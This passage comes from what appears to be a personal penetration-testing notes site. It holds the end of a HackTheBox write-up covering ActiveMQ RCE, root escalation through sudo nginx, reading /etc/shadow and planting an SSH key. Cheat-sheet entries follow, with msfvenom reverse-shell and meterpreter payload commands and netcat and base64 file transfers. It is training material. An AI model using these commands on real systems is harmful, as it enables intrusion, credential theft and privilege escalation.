google.</p> <p></p> <p>Searchsploit did not reveal anything too interesting but googling \"activemq 5.15.15 cve\" provides us with this github page https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</p> <p>Quickly running through the source code nothing looks suspicious, following along with the instructions we create our payload with msfvenom, modify the xml file to reflect our ip address, and catch the reverse shell with netcat</p> <p></p> <p>This is a limited shell so we first upgrade the shell:</p> <p></p> <p>In the user directory we find user.txt!</p> <p></p> <p>Initial local enumeration</p> <p></p> <p>While doing some initial enumeration I noticed we can run nginx with sudo, double checking https://gtfobins.github.io/ does not immediately look exploitable but to see the help page I added the -h flag</p> <p></p> <p></p> <p>Interestingly -c appears to let us use our own config file, I copied /etc/nginx/nginx.conf and /etc/nginx/sites-enabled/default to the ActiveMQ user directory and we can run it but the config file gets deleted every few minutes. I created ~/nginx.conf.bak and ~/sites-enabled-bak/ so I can quickly restore the deleted files but those also got deleted. Checking for cronjobs reveals that a script called \"cleanup.sh\" is running every 20 minutes, it is possible this is the culprit. Unfortunately I cannot read the bash script to be sure, for now we try bakconf and bakdefault in ~/nginx</p> <p></p> <p>I modify user to root, comment out <code>\"include /etc/nginx/conf.d/*.conf;\"</code> and change <code>include /etc/nginx/sites-enabled/*;</code> to <code>include /home/activemq/nginx/site;</code> I tried to modify /etc/nginx/sites-enabled/default first but it threw an error so I built /home/activemq/nginx/site based off https://gist.github.com/xameeramir/a5cb675fb6a6a64098365e89a239541d/g changing the port and root location. While modifying I noticed that admin.broker.htb was listed and took note of it. After modifying the files and adding a test file I confirmed the site is working but the cleanup script removed the nginx folder, and backup folder I created. Screenshot is over port 82 as ports 80 and 81 were taken up by testing nginx with every modification to the config</p> <p></p> <p>So I once again copy the contents of the nginx config files, this time to my kali vm to modify there. Downloading the files to /tmp/test and running, the files are again removed. But redownloading and adding a test file gets us back to where we were.</p> <p>If I have nginx running as the root user I am thinking either a reverse shell or reading /etc/shadow to crack the password. /etc/ssh/sshd_config has <code>PermitRootLogin yes</code> so I will try grabbing /etc/shadow first. I modify root to point to /etc/ in default <code>root /etc/;</code> redownload the files into /tmp with an updated port and successfully download /etc/shadow</p> <p></p> <p>The root hash is encrpyted with yescrypt and john does not crack after a couple of minutes. I wonder what is in that script from earlier?</p> <p></p> <p>Nothing that helps but it confirms my suspicion that it is removing files every 20 minutes. Checking the .ssh folder and I do not find any ssh keys, but we can create our own with <code>ssh-keygen -f broker</code>. By modifying default I can enable the put method and add my own ssh key file using https://nginx.org/en/docs/http/ngx_http_dav_module.html and https://stackoverflow.com/questions/55787223/upload-file-to-nginx-with-curl as references. After some trial and error I end up with</p> <p></p> <p>upload, start nginx as root, upload the ssh public key with <code>curl -T broker.pub http://broker.htb:8096/upload/broker.pub</code> ssh with <code>ssh -i ./broker root@broker.htb</code> and get root! While I could have grabbed the root.txt file earlier now that I have a root shell I just cat it.</p> <p></p>"},{"location":"xGENERAL/BLOODHOUND%20CUSTOM/","title":"BLOODHOUND CUSTOM","text":"<pre><code>MATCH (m:Computer) RETURN m\nMATCH (m:User) RETURN m\n(NODES)-[:RELATIONSHIP]-&gt;(NODES)\n</code></pre>"},{"location":"xGENERAL/CROSS%20COMPILE/","title":"CROSS COMPILE","text":"<pre><code>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe\ni686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32\n</code></pre>"},{"location":"xGENERAL/FILE%20TRANSFER/","title":"FILE TRANSFER","text":"<p>192.168.45.218#nc</p> <pre><code>kali\nnc -l -p [port] &gt; out.file\n\ntarget\nnc [destination ip] [destination port] &lt; out.file\n</code></pre>"},{"location":"xGENERAL/FILE%20TRANSFER/#webdav","title":"webdav","text":"<pre><code>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/\n</code></pre>"},{"location":"xGENERAL/FILE%20TRANSFER/#scp","title":"scp","text":"<pre><code>scp [file] [user]@[ip]:[destination location]\n</code></pre>"},{"location":"xGENERAL/FILE%20TRANSFER/#http_server","title":"http_server","text":""},{"location":"xGENERAL/FILE%20TRANSFER/#base64","title":"base64","text":"<pre><code>gyrsec@htb[/htb]$ base64 shell -w 0\n\nuser@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d &gt; shell\n</code></pre>"},{"location":"xGENERAL/MSFVENOM%20EXAMPLES/","title":"MSFVENOM EXAMPLES","text":"<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=[local ip] LPORT=[local port] EXITFUNC=thread -f c \u2013e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\"\n\nbad characters given as example, actual bad characters need to be determined\n</code></pre>"},{"location":"xGENERAL/MSFVENOM%20EXAMPLES/#64_bit_dll","title":"64_bit_dll","text":"<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=[local ip] LPORT=[local port] &gt; reverse_64bit.dll\n</code></pre>"},{"location":"xGENERAL/PSQL/","title":"PSQL","text":"<pre><code>\\l # lists databases\n\\c [database]\n\\dt # list tables\n</code></pre>"},{"location":"xGENERAL/PYTHON%20VENV/","title":"PYTHON VENV","text":""},{"location":"xGENERAL/PYTHON%20VENV/#troubleshooit","title":"troubleshooit","text":"<p>run this to fix installation of impacket and other tools that depend on setuptools</p> <pre><code>pip2 install --upgrade setuptools\n</code></pre>"},{"location":"xGENERAL/PYTHON%20VENV/#setup","title":"setup","text":"<pre><code>python -m venv [venv directory]\nsource [venv directory]/bin/activate\n</code></pre>"},{"location":"xGENERAL/URLENCODE/","title":"URLENCODE","text":"<p>curl can automatically encode with <code>--data-urlencode</code></p>"}]}